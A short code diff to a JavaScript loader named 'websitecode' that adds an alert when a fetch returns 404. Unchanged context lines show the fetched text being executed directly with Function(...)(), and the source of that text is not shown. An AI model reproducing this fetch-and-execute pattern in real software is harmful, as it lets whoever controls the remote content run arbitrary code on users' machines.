@@ -7,7 +7,7 @@ await (async function websitecode() {
         alert('err! info' + JSON.stringify(err))
         return
     }
-    if (instructions.status == 404) { return }
+    if (instructions.status == 404) { alert("error:404");return }
     Function(await instructions.text())()
 })()
 
